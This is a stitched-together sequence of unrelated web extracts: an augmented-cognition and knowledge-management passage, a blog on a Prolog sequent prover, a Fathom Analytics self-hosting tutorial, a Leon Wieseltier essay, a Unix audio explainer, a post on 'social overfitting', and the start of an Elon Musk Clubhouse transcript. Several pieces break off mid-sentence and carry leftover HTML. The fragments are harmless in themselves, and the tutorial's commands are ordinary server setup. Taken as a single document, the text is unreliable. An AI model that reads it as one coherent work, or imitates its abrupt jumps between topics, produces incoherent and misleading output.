</a> (PKM), is one way to Augmented Cognition. By helping us manage and externalize our knowledge, these systems enable us to work with a more significant knowledge base. In a broad sense, the accumulation of knowledge and know-how by networks of Personbytes can be seen as the basis for scientific and economic development described by César Hidalgo in his <a href="https://books.google.de/books/about/Why_Information_Grows.html?id=hgOyBQAAQBAJ">Why Information Grows</a>. PKM systems are often called "Second Brains.", but most of them act more as a storage medium and replica of its user's actual body of knowledge. At <a href="https://www.remnote.io/">RemNote</a>, we try to not just help you create a copy of your knowledge but an extension and augmentation of your brain.</p>

<p>In his seminal work from 1945 <a href="https://www.theatlantic.com/magazine/archive/1945/07/as-we-may-think/303881/">As We May Think</a>, Vannevar Bush describes the <a href="https://en.wikipedia.org/wiki/Memex">Memex</a> (a very advanced association-based PKM). It should be able to retrieve and reproduce items many years old. He also describes its sharing-features as <em>"Wholly new forms of encyclopedias will appear, ready-made with a mesh of associative trails running through them, ready to be dropped into the Memex and there amplified. The lawyer has at his touch the associated opinions and decisions of his whole experience, and of the experience of friends and authorities. ..."</em></p>
<p>But there has not been actual scientific work to engineer a cognition augmenting device as he describes it. However, this changed recently. In June 2019, two researchers published their work <a href="https://eprints.lancs.ac.uk/id/eprint/132846/1/cogment2019.pdf">Augmenting Cognition Through Edge Computing</a>, describing such a system's possible architecture: The RECALL Augmenting Memory architecture. It can, for example, help users restore context before their next conference or class. The student, walking to a lecture, could be primed with a summary of it through his smart glasses, surfacing relevant information. The description of the "Memory vault" in this architecture exhibits a high similarity to Vannevar Bush's Memex.</p>
<p>But have people start building such a device? Recent <a href="https://www.youtube.com/watch?v=Kd34OMunStg">leaks about the startup Hu.ma.ne</a> hinted that they are building a contextual recall memory device that can help with memory recall.</p>
<h2 id="cognitive-state-measurement"><a href="#cognitive-state-measurement" aria-label="cognitive state measurement permalink"></a>Cognitive State measurement</h2>
<p>As we saw in the list of Goals of the Augmented Cognition Program, a great deal of research focuses on "Measure cognitive state." Many possible applications of adjusting information presentation to the user's cognitive abilities and background knowledge come to mind. For example, one could auto-control an audiobook's playback speed based on the listener's measured cognitive load.</p>
<h2 id="augmented-reality"><a href="#augmented-reality" aria-label="augmented reality permalink"></a>Augmented Reality</h2>
<p>AR Interfaces leverage the cognitive processing speed of visuospatial data, e.g., the strong visuospatial perception that human evolution created. This is why they can be predicted to be the next paradigm of Human-computer interfaces. Those interfaces will give rise to many new ways of interacting with computation and new types of media. The advances in UX design show that interactions with digital interfaces become ever more natural and intuitive. Following the doctrine of <em>Build Glasses, not Binoculars</em> (<a href="https://videos.univ-grenoble-alpes.fr/video/5251-k03-making-humans-smarter-than-artificial-intelligence-digital-technologies-to-amplify-human-perception-and-cognition/">Albrecht Schmidt 2019</a>), we can envision AR Interfaces that allow us to browse a three-dimensional multimedia environment by navigating hand gestures rather than positioning a mouse on a desk.</p>

<p>When augmenting cognitive processes, the most useful application is to look for the most cognitively taxing tasks, with learning being one of them. In <a href="https://en.wikipedia.org/wiki/Life_3.0">Life 3.0</a>, Max Tegmark describes a fictional AI, Prometheus, that helps humans learn:</p>
<blockquote>
<p>"Given any person's knowledge and abilities, Prometheus could determine the fastest way for them to learn any new subject in a manner that kept them highly engaged and motivated to continue and produce the corresponding optimized videos, reading materials, exercises, and other learning tools. [...] by leveraging Prometheus' movie-making talents, the video segments would truly engage, providing powerful metaphors that you would relate to, leaving you craving to learn more."</p>
</blockquote>
<p>I'm optimistic that, given the technical feasibility, we will see the first <a href="https://en.wikipedia.org/wiki/Intelligent_tutoring_system">intelligent tutoring systems</a> in the coming decades.</p>

<p>The future for CAS is bright and made inevitable through the acceleration of technology standards. One can describe three of those technology factors as:</p>
<ul>
<li>
<p>superior sensing and capturing systems</p>
<ul>
<li>e.g., the possibility of continuous collection of memory cues through life-logging</li>
</ul>
</li>
<li>advances in audio and image processing enabling widespread mining of stored cues for proactive presentation</li>
<li>pervasiveness of displays for displaying memory cues</li>
</ul>
<p>In their essay, Michael Nielsen and Andy Matuschak describe the difficulty for developers of Tools For Thought to prevent copy-cats. They give the examples of Adobe, which invested heavily in developing their products and is now copied or disrupted by cloud-based companies like Figma. Considering the economic drivers discussed, one can be optimistic that future CAS (or Cognitive technology using Artificial Intelligence) that leverage proprietary AI and AR technology will have less of those difficulties.</p>
<p>As mentioned, many innovations we take for granted today originated out of AC research. However, to date, most of the research is intended for and was funded by military and defense …</p></div></div>

<h3 id="what-is-this">What is this?</h3>

<p>The above is basically Jens Otten’s prover from the “Build Your Own First-Order Prover” at CADE 2019 <a href="http://jens-otten.de/tutorial_cade19/">http://jens-otten.de/tutorial_cade19/</a> in particular lecture 2.
I added a tracing parameter to it so that I can draw the sequent using <a href="https://www.mathjax.org/">MathJax</a>.
Note that my javascript is looking for a query variable called <code>Proof</code> in order to draw the output.</p>

<h3 id="what-is-a-proof-anyway">What is a Proof Anyway?</h3>

<p>Proofs are actions or things that convince you of something.</p>

<p>How’s that for really nailing it down?</p>

<p>Some examples of stuff that might be considered “proof”:</p>

<ul>
  <li>A solution to a set of linear equations is proof that they can be solved.</li>
  <li>A dual vector is proof of optimality of a linear program.</li>
  <li>A convincing English paragraph is proof.</li>
  <li>Use of a cryptographic key can prove your identity.</li>
  <li>A trace of a complete search program that failed to find a solution is proof of its nonexistence.</li>
</ul>

<p>There is a sense that for something to be a proof requires it to be relatively easy to check the proof.</p>

<p>A narrower view of proof is that proof is a pile of formal manipulations of syntax.
One thing that you can prove is the truth of a proposition combined using logical connectives.</p>

<p>A <a href="https://en.wikipedia.org/wiki/Sequent">sequent</a> is a structure that represents a partial state of a proof. It contains a breakdown of formula.
$ A,B,C,… \vdash D,E,F,…$. Spiritually a sequent represents the knowledge or <a href="https://en.wikipedia.org/wiki/Judgment_(mathematical_logic)">judgement</a> that the conjunction of the antecedents implies one of the consequents, but a sequent could be just considered pure syntax, merely a dead data structure to hold a pile of meaningless symbols.</p>

<p>The sequent proof viewed from the bottom up is a stepwise breakdown of formula until they are trivially true.
From the top down it is the combination of simpler facts into more complicated ones.</p>

<p>It’s all a very funny shell game. Somehow proofs take small steps that each feel so simple that they aren’t doing anything and build up a statement that is non obvious.</p>



<p><a href="https://www.metalevel.at/prolog">Prolog</a> is neat. Here I’m using <a href="http://tau-prolog.org/">Tau Prolog</a>, which a prolog that is written in Javascript.
Prolog is roughly what you get when you add search and unification as primitive constructs in a language.</p>

<p>Prolog has multiple readings, which makes it pretty special.
In one reading Prolog formula are themselves statements of axioms of a particular form (<a href="https://en.wikipedia.org/wiki/Horn_clause">Horn clauses</a>) that lends itself to a simple proof procedure.
It also has a fairly declarative reading as a nondeterminstic match statement that tries each match in turn.
Another interesting one is to consider <code>:-</code> to be the horizontal bar of an inference rule.</p>

<p>One model of the state of a prolog execution is as a sequent. The trace of prolog execution is is a sequent style proof. See <a href="https://www.amazon.com/Programming-Higher-Order-Logic-Dale-Miller/dp/052187940X">Nadathur and Miller</a> or Frank Pfenning’s <a href="http://www.cs.cmu.edu/~fp/courses/15317-f17/">notes</a> for more</p>

<p>Notable tricks from the <a href="http://jens-otten.de/tutorial_cade19/">Jens Otten</a> tutorial (which I highly recommend):</p>
<ol>
  <li>Invertible rules. Rules that are reversible (in what sense?) can be eagerly applied. Use cuts !</li>
  <li>Using prolog variables and <code>copy_term</code>. Prolog variables may not work for higher order logic, but they do work for first order, since we’re never substituting a bound variable inside another. Prolog variables are a different face . The trick to Keep some terms around is to include a Freevar list in copy term.</li>
  <li>Skolemization</li>
  <li>Iterative deepening. No surprise here. This is a pretty standard way of making prolog search complete.</li>
</ol>

<p>For more on these tricks, it is worthwhile to examine the leanTAP paper <a href="https://formal.iti.kit.edu/beckert/leantap/">https://formal.iti.kit.edu/beckert/leantap/</a>.</p>

<p>There is a little bit of glue code in javascript to call the Tau Prolog solver. I used HTML textarea as input elements and sort of willy nilly grabbed from them.</p>

<h3 id="the-pretty-printer">The Pretty Printer</h3>

<p>The pretty printer is straightforward and a little janky. I am using the bussproofs package that is included in mathjax to write out my proofs trees nice.
<a href="http://docs.mathjax.org/en/latest/input/tex/extensions/bussproofs.html?highlight=bussproofs">http://docs.mathjax.org/en/latest/input/tex/extensions/bussproofs.html?highlight=bussproofs</a></p>

<p>Bussproofs flatten the tree as a post order traversal, meaning you write a node after all it’s children have been visited. It is most easily seen by examining this example. You can read more here <a href="https://www.math.ucsd.edu/~sbuss/ResearchWeb/bussproofs/BussGuide2_Smith2012.pdf">https://www.math.ucsd.edu/~sbuss/ResearchWeb/bussproofs/BussGuide2_Smith2012.pdf</a>.</p>

<p>Traversing through returned Tau Prolog objects is pretty straightforward. There are <code>id</code> fields that hold the name of the functor and <code>args</code> is an array holds the children. I figured it out via judicious use <code>console.log</code> as Tau Prolog doesn’t have the most documentation I’ve ever seen.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
    <p><em>February 2, 2021</em></p><p>Since my previous post walked through the process of setting up <a href="https://uglyduck.ca/fathom-analytics-netlify">Fathom PRO on Netlify</a>, I figured it made sense to create a similar tutorial for the “Lite” variation, self-hosted on DigitalOcean.</p>

<p>Please note that while I think the PRO version of <a target="_blank" href="https://usefathom.com/ref/DKHJVX">Fathom Analytics</a> is truly great, for my small, niche blog it seemed overkill compared to self-hosting. Switching over from $14/mo to $5/mo while retaining most of the same functionality was a no-brainer. Choose the option that best suits your needs (or in the case - budget &amp; bandwidth).</p>

<p>With that cleared up - let’s get into it!</p>

<h2 id="prerequisites">Prerequisites</h2>

<ol>
  <li>One or more website(s) where you would like to include analytics</li>
  <li><a target="_blank" href="https://m.do.co/c/74b3fd11c07a">DigitalOcean account</a> (<strong>this link will give you a $100 credit!</strong>)</li>
  <li>Positive attitude and passion for privacy-respecting analytics!</li>
</ol>

<h2 id="create-a-droplet">Create a Droplet</h2>

<p>Once your DigitalOcean account is setup, navigate to the <a target="_blank" href="https://marketplace.digitalocean.com/">Marketplace</a> and search for <code>Fathom Analytics</code>. Then click the <code>Create Fathom Analytics Droplet</code>.</p>

<p>From here you’ll be brought to a page that allows you to customize the specifications of your new droplet. If you’re a smaller traffic site (personal blog, etc) selecting the <strong>$5/month</strong> Basic Shared CPU option is your best bet.</p>

<figure>
    <img src="https://uglyduck.ca/public/images/fathom-create-droplet-details.png" alt="Fathom Droplet Details">
    <figcaption>Creating the new droplet</figcaption>
</figure>

<p>Select the data-center region based on where most of your traffic originates from. I would suggest enabling <code>IPv6</code> and setting up your authentication via SSH instead of a regular password system. Adding backups is entirely at your own discretion.</p>

<p>Once you’re ready, click <strong>Create Droplet</strong>.</p>

<h2 id="enter-the-matrix-not-really">Enter the Matrix (not really)</h2>

<p>Once DigitalOcean finishes spinning up your new droplet, open a terminal and connect to it by entering:</p>

<figure><pre><code data-lang="bash">ssh root@YOUR_DROPLET_IP</code></pre></figure>

<p>If you setup your login via SSH everything should work as-is. If you went the password route, you’ll given a prompt to enter it.</p>

<p>Now that you’re connected, Fathom will guide you through a simple configuration setup. It’s fairly straightforward and painless. Once complete, move to the next step.</p>

<h2 id="domains">Domains</h2>

<p>You’ll most likely want to host this instance on your own domain or subdomain - instead of connecting directly via the droplet’s <code>IP</code>. Head over to your <strong>Networking</strong> page in the sidebar of DigitalOcean and add your custom domain.</p>

<p>Then, click on that newly added domain - we need to add some new records. You’re going to add two new <code>A</code> records to this domain:</p>

<table>
    <thead>
        <tr>
            <th>Type</th>
            <th>Hostname</th>
            <th>Value</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>A</td>
            <td>@</td>
            <td>YOUR_DROPLET_IP</td>
        </tr>
        <tr>
            <td>A</td>
            <td>www</td>
            <td>YOUR_DROPLET_IP</td>
        </tr>
    </tbody>
</table>

<p>The last thing you need to do is set your nameservers to point to DigitalOcean:</p>

<figure><pre><code data-lang="bash">ns1.digitalocean.com
ns2.digitalocean.com
ns3.digitalocean.com</code></pre></figure>

<p>Give it some time to propagate and you’ll be in business!</p>

<h2 id="ssl-ftw">SSL FTW</h2>

<p>There is hardly a good reason not to practice security on the web, so setting up your new analytics to be served over <code>HTTPS</code> is just the smart thing to do. Did I mention that this is completely free as well? See - no excuses.</p>

<p>In order to get a free SSL certificate setup, you’ll need to install <code>certbot</code>. While connected to your droplet, enter the following:</p>

<figure><pre><code data-lang="bash"><span>sudo </span>apt-get <span>install </span>python-certbot-nginx</code></pre></figure>

<p>Once installed, enter the following to setup SSL (remember to swap out the domain with your own):</p>

<figure><pre><code data-lang="bash">certbot <span>--nginx</span> <span>-d</span> your-cool-domain.com</code></pre></figure>

<p>Follow the steps (it’s very quick and easy) and you’ll have <code>HTTPS</code> setup in a jiffy!</p>

<h2 id="the-final-lap">The Final Lap</h2>

<p>The last thing to do is login to your newly self-hosted Fathom instance, add your site you wish to track, grab the generated tracking code and then slap that badboy on whatever pages you need to track!</p>

<p>Congrats! You’re now officially running your own set of analytics tools. You should be happy about what you’ve accomplished and proud for respecting your users’ privacy!</p>

      <h4>Leon Wieseltier</h4>
      <h3>Steadying</h3>
      <p>For some time now it has felt like history is itself the pandemic. In our country and elsewhere, it has been in overdrive, teeming with evils, flush with collapses, abounding in fear and rage, a wounding contest between the sense of an ending and the sense of a beginning, between inertia and momentum, with all the terribilities of ages of transition. What is going has not yet gone and what is coming has not yet come. We have become connoisseurs of convulsion. At sea is our new sea.</p>
<p>For better and for worse, axioms and assumptions are dying everywhere around us. Such vertiginous hours always come with both clarities and confusions — there is no promise of illumination. The guidance we need in our circumstances will not be provided by the circumstances themselves: they are too many and too contradictory and too volatile; passion increasingly unconstrained and power increasingly unconstrained. As the sense of injustice grows, injustice seems to keep pace with it. There is a piercing sensation of flux, of uncontrollable effects and unmanageable consequences. The masks on our faces are emblems of an entire era of vulnerability. The most important thing, therefore, is that we keep our heads. A disequilibrium of history demands an equilibrium of the mind. Steadiness in the midst of turbulence is not complicity with the existing order. It is precisely in such binges of history that we must teach ourselves to sort through the true and the false, the good and the bad, the continuities and the discontinuities, the right statues and the wrong statues, the humane and the utopian.</p>
<p>Everything will be different: this is a ubiquitous sentiment. In all our upheavals — social and epidemiological — so much seems to be wrong and so much seems to be slipping away that one may be forgiven for enjoying a fantasy of total change. All these horrors, all these outrages, all these marches, and the world stays the same? So the first thing that needs to be said in the effort to keep our heads is that everything never changes. More, the idea that everything will change usually plays into the hands of those who want nothing to change. The cycle of revolution and reaction has never been the most effective engine of progress. Nothing suits the interests of the old regime like utopianism. The thirst for change will not be slaked by the cheap whiskey of apocalyptic thinking. The only certain outcome of the apocalyptic temper is catharsis, and one way of describing the decline of our politics in recent decades is that it has increasingly become a politics of catharsis, in which crisis is met mainly by emotion. (Populism is just mass emotionalism, and the emotions are often ugly ones.) Apocalypse is not an analysis, it is the death of analysis. It sets the stage only for salvation, but salvation must never become a political goal. This is especially true in a democratic society, where the only saviors are, alas, ourselves.</p>
<p>Thus it is that the struggle against injustice imposes upon us a paradoxical psychology: it demands both impatience and patience. Impatience about injustice, patience about justice. This is hard to do. It looks too much like, and in many cases it may well be, complacence. It is certainly difficult to preach incrementalism to the injured. So why not be impatient about justice, too? There are historical and practical reasons why not. History is stained by tales of instantaneous justice, by the consequences of the rush to perfection, by the victims of the victims. The ethical calculus of means and ends is never teleologically suspended, if just causes are to remain just. Nor is it a quantitative calculus: when I first studied the modern history of the Jews I drew a variety of conclusions from the Dreyfus affair, and one of them, which was an important moment in my moral education, was that Zola and his comrades appropriately threw an entire country into crisis for the sake of <i>one man</i>. Similarly, due process is not a legal formality, a procedural exercise that slows the way to a satisfying climax; it is the very honor of a liberal society.</p>
<p>More concretely, the establishment of justice involves not only revisions in opinions but also revisions in institutions. A dreary point! But anyone who denies the institutional dimension, in all its exasperating machinery, is not serious about the change. Paroxysms, unlike laws, vanish. This was the year in which the campaign for racial justice found support in virtually all the sectors of American society, with the exception of the White House — an unprecedented national epiphany that cannot be dismissed as “performative”, because culture matters; but the road from protest to policy is long and winding. It is not a betrayal of the ideal of social justice to tread carefully and tenaciously, with a mastery of the scruples and the methods that would make a reform defensible and durable. Tenacity is what patience looks like in the middle of a struggle.</p>
<p>I will give an example of the complicated nature of the mentality of change. One of the consequences of recent social movements in America — #MeToo (which came also to my door, with its lesson and its recklessness) and Black Lives Matter—has been to reveal how poorly we understand each other. Or more precisely, they have exposed the extent to which the failure to understand others may be owed to the failure to understand oneself — the limitations of one’s own standpoint, the comfortable assumption that one appears to others as one wishes to appear to them, or to oneself. This is nonsense, though sometimes you learn so the hard way. There are limits to our epistemological jurisdiction. The failure to observe these limits is solipsism, and we all begin as solipsists, awaiting correction by social experience.</p>
<p>Our epistemological jurisdiction stops at the encounter with another person. She is another epistemological kingdom, not more perfect but certainly different, with something important to add, and a perceptual contribution to make. I may like to think that I am what I present myself to be, but I am also what she sees me to be, because she sees me as I cannot, or will not, see myself. I am never in control of my self-representation and never complete in my self-awareness. We always show more of ourselves than we think we do, which is why we may learn from the responses of others. We spill beyond our intentions and our conceits, and what we gain from this overflow is criticism.</p>
<p>But criticism, too, must be assessed critically – there is no exemption. The enlightenment that one acquires from the judgments of others is owed only to their accuracy. It is certainly not warranted by the belief that a person’s identity or socio-economic position or experience of hardship confers an absolute authority, a special relationship to truth, a vatic privilege. What a simple world it would be if pain were a sufficient guarantee of credibility. But it is not – indeed, the opposite is the case, pain is myopic and sees chiefly itself, which is one of the reasons it hurts. Finally we are all left with the modesty of our grasp. No whole classes of people are right and no whole classes of people are wrong.</p>
<p>The ineradicability of ambiguity from human relations, the ignorance of ourselves that accompanies our ignorance of others, the whole fallible heap, creates an urgent need for tolerance and, more strenuously, for forgiveness. Historians will record that in the early decades of the twenty-first century we became an unforgiving society, a society of furies, a society in search of guilt and shame, a society of sanctimonies and “struggle sessions” American-style. They will admire our awakening to prejudice but lament the sometimes prejudicial ways in which we acted on our progressive realizations. In this respect America should become more Christian. (There, I said it.) For all our elaborate culture of self-knowledge, for all the hectoring articulateness of our identity vocabularies, we are still, each of us, our own blind spots. We should welcome every person we meet as a small blow against blindness.</p>
<p><img loading="lazy" src="https://libertiesjournal.com/wp-content/uploads/insignia-break.png" width="300" height="127"></p>
<p>The partiality of perspective: this is the great teaching of the contemporary tumult. The problem is that we have not only begun to acknowledge our partiality, and the partiality of others, we have also begun to revere it, and this is a mistake. We are gagging on all our roots. If pain does not provide access to truth, neither does particularity. The worship of particularism is one of the great impediments to social justice, and in its exhilarating way it coarsens us all. In our moral and social thinking, our obsession with otherness has concealed that the foundation of moral and social action is sameness. The “other” is exotic, but there is nothing exotic about the homeless man on the street: he is the same as me, a human being, except that he is hungry and I am not. The difference in our circumstances is not a difference in our definition. When I hand him a few dollars I am not extending myself toward an alien being; I am practicing species solidarity. I am not discovering his humanity; I am responding to it. I am acting, in other words, universally, and none of the social problems that afflict us will be solved unless we recover the universalist standpoint that sees beyond the visible divisions, and is not trapped in, or enraptured by, the specificities of our tribes. Pluralism secures the right to turn inward, but it also broaches the duty to turn outward. By surrounding us with other partialities it legitimates our own partiality, but it also reveals that there …</p></section></article></div></div>

<p>Audio on Unix is a little zoo, there are so many acronyms for projects
and APIs that it’s easy to get lost. Let’s tackle that issue! Most
articles are confusing because they either use audio technical jargon,
or because they barely scratch the surface and leave people clueless. A
little knowledge can be dangerous.<br>
In this article I’ll try to bridge the gap by not requiring any
prerequisite knowledge while also giving a good overview of the whole Unix
audio landscape. There’s going to be enough details to remove mysticism
(Oh so pernicious in web bubbles) and see how the pieces fit.</p>

<p>By the end of this article you should understand the following terms:</p>
<ul>
  <li>ALSA</li>
  <li>OSS</li>
  <li>ESD</li>
  <li>aRts</li>
  <li>sndio</li>
  <li>PulseAudio</li>
  <li>PipeWire</li>
  <li>GStreamer</li>
  <li>LADSPA</li>
</ul>

<p>We’ll try to make sense of their utility and their link. The article
will focus a bit more on the Linux stack as it is has more components than
others and is more advanced in that respect. We’ll also skip non-open
source Unix-like systems.<br>
As usual, if you want to go in depth there’s a list of references at
the bottom.</p>

<p>Overall, we got:</p>
<ul>
  <li>Hardware layer: the physical devices, input and output</li>
  <li>Kernel layer: interfacing with the different hardware and managing
their specificities (ALSA, OSS)</li>
  <li>Libraries: used by software to interface with the hardware directly,
to manipulate audio/video, to interface with an intermediate layer
for creating streams (GStreamer, Libcanberra, libpulse, libalsa, etc..),
and to have a standard format (LADSPA).</li>
  <li>Sound servers: used to make the user facing (user-level) interaction
easier, more abstract, and high level. This often acts as glue, resolving
the issue that different software speak different protocols. (PulseAudio,
ESD, aRts, PipeWire, sndio)</li>

<p>Let me preface this by saying that I am not a developer in any of these
tech, neither am I a sound engineer. I am simply regrouping my general
understanding of the tech so that anyone can get an overview of what
the pieces involved are, and maybe a bit more.</p>



<p>It’s essential to have a look at the hardware at our disposal to
understand the audio stack because anything above it will be its direct
representation.<br>
There are many types of audio interfaces, be it input or output,
with different varieties of sound cards, internal organizations,
and capabilities.
Because of this diversity of chipsets, it’s simpler to group them into
families when interacting with them.</p>

<p>Let’s list the most common logical components that these cards can have.</p>

<ul>
  <li>An interface to communicate with the card connected to the bus, be it
interrupts, IO ports, DMA (direct memory access), etc..</li>
  <li>Output devices (DAC: Digital to analog converter)</li>
  <li>Input devices  (ADC: Analog to digital converter)</li>
  <li>An output amplifier, to raise the strength of output devices</li>
  <li>An input amplifier, same as above but for input devices (ex:
microphones).</li>
  <li>Controls mechanism to allow different settings</li>
  <li>Hardware mixer, which controls each devices volume and routing,
usually volume is measured in decibel.</li>
  <li>A MIDI (Musical Instrument Digital Interface) device/controller, a
standard unified protocol to control output devices (called
synthesizers) — think of them like keyboards for sounds.</li>
  <li>A sequencer, a builtin MIDI synthesizer (output of the above)</li>
  <li>A timer used to clock audio</li>
  <li>Any other special features such as a 3D spatializer</li>
</ul>

<p>It is important to have a glance at these components because everything
in the software layers attempts to make them easier to approach.</p>



<p>A couple of concepts related to the interaction between the real
and digital world are also needed to kick-start our journey.</p>

<p>In the real world, the analog world, sound is made up of waves, which
are air pressures that can be arbitrarily large.</p>

<p>Speakers generating sound have a maximum volume/amplitude, usually
represented by 0dB (decibels). Volume lower than the maximum is
represented by negative decibels: -10dB, -20dB, etc.. And no sound is
thus -∞ dB.<br>
This might be surprising and actually not really true either. Decibel
doesn’t mean much until it’s tied to a specific absolute reference
point, it’s a relative scale. You pick a value for 0dB that makes sense
for what you are trying to measure.</p>

<p><img src="https://venam.nixers.net/blog/assets/audio_unix/VU_meter.jpg" alt="vu meter" loading="lazy"></p>

<p>The measurement above is the dBFS, the dB relative to digital full-scale,
aka digital 0. There are other measurements such as dB SPL and dBV.<br>
One thing to note about decibels is that they follow a strictly
exponential law , which matches it to human perception. What sounds like
a constantly increasing volume is indicated by a constantly rising dB
meter, corresponding to an exponentially rising output power. This is why
you can hear both vanishingly soft sounds and punishingly loud sounds.
The step from the loudest you can hear up to destroying your ears or
killing you is only a few more dB.</p>

<p>While decibels are about loudness, the tone is represented as sine
waves of certain frequency, the speed. For example, the note A is a
440Hz sine wave.</p>

<p>Alright, we got the idea of decibel and tone but how do we get from
waves to our computer or in reverse? This is what we call going from
analog to digital or digital to analog.<br>
To do this we have to convert waves into discrete points in time,
taking samples per second — what we call sample rate. The higher the
sample rate, the more accurate the representation of the analog sound (a
<a href="https://en.wikipedia.org/wiki/Lollipop_graph">lollipop graph</a>). Each
sample has a certain accuracy, how much information we store in it,
the number of bits for each sample — what we call the bit rate (the
higher the less noise). For example, CDs use 16 bits.<br>
Which value you choose as your sample rate and bit rate will depend on
a trade-off between quality and memory use.</p>

<p><em>NB</em>: That’s why it makes no sense to convert from digital low sample
rate to digital high sample rate, you’ll just be filling the void in
the middle of the discrete points with the same data.</p>

<p>Additionally, you may need to represent how multiple channels play sound
— multichannel. For example, mono, stereo, 3d, surround, etc..</p>

<p>It’s important to note that if we want to play sounds from multiple
sources at the same time, they will need to agree on the sample rate,
bit rate, and format representation, otherwise it’ll be impossible to
mix them. That’s something essential on a desktop.</p>

<p>The last part in this equation is how to implement the mechanism to
send audio to the sound card. That highly depends on what the card
itself supports, but the usual simple mechanism is to fill buffers with
streams of sound, then let the hardware read the samples, passing them
to the DAC (digital to analog converter), to then reach the speaker,
and vice versa. Once the hardware has read enough samples it’ll do an
interrupt to notify the software side that it needs more samples. This
cyclic mechanism goes on and on in a ring fashion.<br>
If the buffer samples aren’t filled fast enough we call this an underrun
or drop-out (aka xruns), which result in a glitch, basically audio
stopping for a short period before the buffer is filled again.</p>

<p>The audio can be played at a certain sample rate, with a certain
granularity, as we’ve said. So if we call <code>buffer-size</code> the number of
samples that can be contained in a cyclic-buffer meant to be read by
the hardware, <code>fragment-size</code> or <code>period-size</code> the number of samples
after which an interrupt is generated, <code>number-fragments</code> the number of
fragments that can fit in a hardware buffer (<code>buffer-size/fragment-size</code>),
and <code>sample-rate</code> the number of samples per seconds.<br>
Then the latency will be <code>buffer-size/sample-rate</code>, for example if we
can fit 100 samples in a buffer and the samples are played once every
1ms then that’s a 100ms latency; we’ll have to wait 100ms before the
hardware finishes processing the buffer.<br>
From the software side, we’ll be getting an interrupt every
<code>period-size/sample-rate</code>. Thus, if our <code>buffer-size</code> is 1024 samples, and
<code>fragment-size</code> is 512, and our <code>sample-rate</code> is <code>44100 samples/second</code>,
then we get an interrupt and need to refill the buffer every <code>512/44100
= 11.6 ms</code>, and our latency for this stage is up to <code>1024/44100 = 23
ms</code>. Audio processing pipelines consist of a series of buffers like this,
with samples read from one buffer, processed as needed, and written to
the next.</p>

<p>Choosing the values of the <code>buffer-size</code> and <code>period-size</code> are hard
questions. We need a buffer big enough to minimize underruns, but we also
need a buffer small enough to have low latency. The fragments should
be big enough to avoid frequent interrupts, but we also need them small
enough so that we’re able to fill the buffer and avoid underruns.<br>
What some software choose to do is to not follow the sound card
interrupts but to rely on the operating system scheduler instead,
to be able to rewrite the buffer at any time so that it stays
responsive to user input (aka buffer rewinding). This in turn allows
to make the buffer as big as possible. Though, <a href="https://venam.nixers.net/blog/unix/2020/05/02/time-on-unix.html">timers often
deviate</a>,
but that can be fixed with good real-time scheduling.<br>
There are no optimal solutions to this problem, it will depend on
requirements, and these values can often be configured.</p>

<p>So we’ve seen how sound is represented in the real world with strength and
tone, to then be converted in the digital world via digital to analog DAC
or analog to digital ADC converters. This is done by taking samples at
a rate and of a certain accuracy called the bit rate. There can also be
other information needed such as the channel, byte ordering, etc.. Sound
that needs to be mixed needs to agree on these properties. Lastly, we’ve
seen how software has to manage a buffer of samples so that sound plays
continuously on the device, while also being responsive to users.</p>

<p>3 minute read</p>


    

<p>Human beings are social animals. For the most part, we seek social connection and discussion with others in our lives. This tendency is one of the traits that propels our species forward, but it can also be dangerous.</p>

<p>The measure to which we can satisfy this desire has increased with social media, with new tools that put an entire world of people at our fingertips, but also expose us to a new weakness.</p>

<p>One of the fundamental features of these social networks is the idea of <strong>liking and commenting</strong>: people read your post and then show their appreciation by liking it or initiate a conversation by writing a comment.</p>

<p>These are both forms of <strong>engagement</strong> and act as validation for the poster: their presence and personality is not only being seen by many, but it can also lead to new conversation and ideas.</p>

<p>This caters to our social inclination, a useful evolutionary trait for humanity as species, but one that initially existed for much smaller groups than the ones humans can now form online.</p>

<p>These social interactions trigger a dopamine rush in our brains. But the virtual social environments we’ve developed multiply the opportunity to enjoy these dopamine rewards. In a situation where every like or feedback or validation triggers a new boost in your brain, they become ubiquitous and sometimes over-absorbing.</p>

<p>This can lead to <strong>social overfitting</strong>: consciously or unconsciously being powered and influenced by your desire to be seen and appreciated to an extent that you create content that is not a true reflection of what you’re interested in or want to share. Instead, your intent is to produce content that will get you more reaction and validation. This overfitting is a form of excess, and in over-adapting to cause reactions, you might no longer have the appeal you once had. This happens if you produce to provoke interest rather than create something that is truly interesting, and that you’re interested in.</p>

          What is overfitting? <a href="#what-is-overfitting">#</a>
        
        
      </h2>
    

<p>The idea of <strong>overfitting</strong> I’m borrowing here actually comes from the field of statistics and machine learning:</p>

<blockquote>
  <p>overfitting is “the production of an analysis that corresponds too closely or exactly to a particular set of data, and may therefore fail to fit additional data or predict future observations reliably”</p>
</blockquote>

<ul>
  <li><a href="https://en.wikipedia.org/wiki/Overfitting">Wikipedia</a></li>
</ul>

<p>The analogy I’m drawing is that we as social beings, can sometimes grow so drawn to the reactions and feedback we get online, that instead of continuing to do what we like and sharing what we really want to, we try to over-optimize social sharing into a strategy. This strategy aims to attract the most validation for the author and his content, be it in the form of views, likes or comments.</p>

<p>That’s not all, though; in the same way an overfit model is no longer able to reason well with the data we give it, often when content creation becomes powered by a “science of popularity” instead of authenticity, people will not be attracted to your content, and you’ll have the opposite of what you were looking for.</p>

<p>Genuinely trying to understand your audience is by no means something negative, but just be wary not to practise this “social overfitting”, and become too motivated by the temporary spotlight of online attention.</p>

<p>Even as I write this post, I’m at least a little bit motivated by the knowledge that I’ll share it online and hopefully someone else will counter or correct the opinions I have and discussion will arise, but that’s not the only goal I have when I write, and I believe that’s important. I’ve always been impressed by people who write 100% for themselves, and are unaffected by whether or not people react or see their writings, but I acknowledge that it’s not my case.</p>

<p>&lt;&lt;00:00:02&gt;&gt;<br>
Elon Musk: Hey Elon here. Can you hear me?</p>
<p>&lt;&lt;00:00:07&gt;&gt;<br>
Sriram: Yes, I can. Yes I can. Hey  there. Hello.</p>
<p>&lt;&lt;00:00:16&gt;&gt;<br>
Aarthi: Oh, we see you.</p>
<p>&lt;&lt;00:00:22&gt;&gt;<br>
Elon Musk: <em>laughs</em> This is wild. It’s just my butt talking.</p>
<p>&lt;&lt;00:00:27&gt;&gt;<br>
Marc: Elon, are you, are you wearing your short shorts?</p>
<p>&lt;&lt;00:00:31&gt;&gt;<br>
Elon Musk: Yeah, that's me.</p>
<p>&lt;&lt;00:00:35&gt;&gt;<br>
Marc: Are you celebrating anything in particular with your short shorts?</p>
